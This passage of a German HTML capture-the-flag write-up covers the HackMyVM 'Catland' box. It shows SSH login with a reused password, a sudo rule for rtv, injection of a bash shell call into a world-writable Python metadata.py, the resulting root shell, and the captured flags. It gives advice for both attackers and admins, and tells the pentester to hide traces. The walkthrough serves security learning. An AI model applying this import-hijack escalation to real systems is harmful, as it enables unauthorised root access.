+└─# <span class="command">ssh laura@catland.hmv</span></div>
+                    <pre>
+The authenticity of host 'catland.hmv (192.168.2.126)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+[...]
+laura@catland.hmv's password: <span class="password">[Passwort berbatov eingegeben]</span>
+Linux catland.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+[...]
+Last login: Sat Jan  7 14:44:44 2023 from 192.168.0.29
+<span class="prompt" style="color: yellow;">laura@catland:~$</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Versuch, sich per SSH als Benutzer `laura` mit dem geknackten GRUB-Passwort (`berbatov`) anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Das Passwort wurde für den Benutzer `laura` wiederverwendet. Eine interaktive Shell als `laura` wurde erhalten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Enumerieren Sie die Berechtigungen des Benutzers `laura`, insbesondere `sudo -l`. Suchen Sie nach der User-Flag.<br><strong>Empfehlung (Admin):</strong> Verhindern Sie Passwort-Recycling. Erzwingen Sie unterschiedliche, starke Passwörter für verschiedene Konten und Systeme (Bootloader, Systembenutzer etc.).</p>
+
+            <p class="analysis"><strong>Enumeration als Laura:</strong></p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for laura on catland:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User laura may run the following commands on catland:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/rtv --help</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `sudo -l` zeigt die `sudo`-Berechtigungen für `laura`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Laura darf den Befehl `/usr/bin/rtv --help` als jeder Benutzer (`ALL:ALL`) ohne Passwort (`NOPASSWD`) ausführen. Dies ist ein klarer Hinweis auf eine mögliche Privilegienerweiterung, da `rtv` (Reddit Terminal Viewer) ein Python-Skript ist und die Ausführung mit `--help` möglicherweise ausgenutzt werden kann, oder weil die Ausführung als `root` (Teil von `ALL:ALL`) generell gefährlich ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `/usr/bin/rtv`-Skript. Suchen Sie nach Möglichkeiten, die Ausführung von `rtv --help` für Codeausführung zu missbrauchen (z.B. durch Manipulation von importierten Modulen oder Umgebungsvariablen).<br><strong>Empfehlung (Admin):</strong> Gewähren Sie `sudo`-Rechte nach dem Prinzip des geringsten Privilegs. Erlauben Sie niemals die Ausführung von Skripten oder komplexen Programmen mit `sudo`, insbesondere nicht mit `ALL:ALL` und `NOPASSWD`, es sei denn, es ist absolut unvermeidlich und das Programm ist sicher gegen Missbrauch.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">933ff8025e8944b6b3b797b2f006b2c0</span></pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die User-Flag wird aus `user.txt` im Home-Verzeichnis von `laura` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> User-Flag erfolgreich erfasst.</p>
+
+             <p class="analysis"><strong>Untersuchung des rtv-Skripts und Exploit-Vorbereitung:</strong></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">cat /usr/bin/rtv</span></div>
+                    <pre>
+#!/usr/bin/python3
+# EASY-INSTALL-ENTRY-SCRIPT: 'rtv1.27.0','console_scripts','rtv'
+import re
+import sys
+
+# for compatibility with easy_install; see #2198
+__requires__ = 'rtv1.27.0'
+
+try:
+    from importlib.metadata import distribution
+except ImportError:
+    try:
+        from importlib_metadata import distribution
+    except ImportError:
+        from pkg_resources import load_entry_point
+
+
+def importlib_load_entry_point(spec, group, name):
+    dist_name, _, _ = spec.partition('')
+    matches = (
+        entry_point
+        for entry_point in distribution(dist_name).entry_points
+        if entry_point.group == group and entry_point.name == name <span class="comment"><!-- == maskiert --></span>
+    )
+    return next(matches).load()
+
+
+globals().setdefault('load_entry_point', importlib_load_entry_point)
+
+
+if __name__ == '__main__': <span class="comment"><!-- == maskiert --></span>
+    sys.argv[0] = re.sub(r'(-script\.pyw?|\.exe)?$', '', sys.argv[0])
+    sys.exit(load_entry_point('rtv1.27.0', 'console_scripts', 'rtv')())
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `/usr/bin/rtv` wird angezeigt. Es ist ein Python3-Skript, das `importlib.metadata` verwendet, um Entry Points zu laden. Dies ist ein Hinweis auf eine mögliche "Python Import Hijacking"-Schwachstelle, wenn eine der importierten Bibliotheken oder deren Abhängigkeiten vom Benutzer manipuliert werden kann.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">find / -name metadata -ls 2>/dev/null</span></div>
+                    <pre>
+   932760     20 -rw-r--rw-   1 root     root        18210 Feb 28  2021 <span class="command">/usr/lib/python3.9/importlib/metadata.py</span>
+   [...]
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Suche nach der Datei `metadata.py`, die von `rtv` importiert wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `/usr/lib/python3.9/importlib/metadata.py` wird gefunden. Die Berechtigungen `-rw-r--rw-` sind sehr ungewöhnlich für eine Systemdatei. Sie bedeutet, dass jeder Benutzer (`world writable`) die Datei ändern kann!</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Schreibberechtigung für `metadata.py`. Fügen Sie Code hinzu, der eine Shell startet (z.B. `import os; os.system('/bin/bash -i')`). Führen Sie dann den `sudo`-Befehl (`sudo rtv --help`) aus. Da `rtv` `metadata.py` importiert, wird Ihr eingefügter Code mit Root-Rechten ausgeführt.<br><strong>Empfehlung (Admin):</strong> Korrigieren Sie sofort die Berechtigungen für `/usr/lib/python3.9/importlib/metadata.py` und andere Systemdateien. Standardmäßig sollten solche Dateien nur für `root` schreibbar sein (z.B. `644`, `-rw-r--r--`). Untersuchen Sie, warum diese Datei schreibbar war.</p>
+
+             <p class="analysis"><strong>Exploit-Durchführung:</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">nano /usr/lib/python3.9/importlib/metadata.py</span></div>
+                     <pre>[Datei wird bearbeitet: os.system('/bin/bash -i') hinzugefügt]</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `metadata.py` wird bearbeitet und der Befehl zum Starten einer interaktiven Bash-Shell wird hinzugefügt.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">laura@catland:~$</span> <span class="command">sudo rtv --help</span></div>
+                     <pre><span class="prompt" style="color: red;">root@catland:/home/laura#</span> <span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root)</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der erlaubte `sudo`-Befehl wird ausgeführt. `rtv` startet, importiert die modifizierte `metadata.py`, führt den eingefügten `os.system`-Befehl aus und startet eine Bash-Shell.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Perfekt! Eine Root-Shell wurde durch Ausnutzung der unsicheren Dateiberechtigung und des `sudo`-Eintrags erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie die Root-Flag. Bereinigen Sie die Änderung an `metadata.py`, wenn Sie unentdeckt bleiben möchten.<br><strong>Empfehlung (Admin):</strong> Berechtigungen korrigieren. `sudo`-Regel entfernen oder sichern.</p>
+
+            <p class="analysis"><strong>Root-Flag lesen:</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">root@catland:/home/laura#</span> <span class="command">cat /root/root.txt</span></div>
+                     <pre><span class="password">ca555fc5afb4475bb0878d2b1a76cbe9</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Root-Flag wird aus `/root/root.txt` ausgelesen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ziel erreicht. Root-Flag erfolgreich erfasst.</p>
+
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/laura/user.txt</div>
+                     <div class="flag-value"><span class="password">933ff8025e8944b6b3b797b2f006b2c0</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">ca555fc5afb4475bb0878d2b1a76cbe9</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. April 2023</p>
+    </footer>
+</body>
+</html>
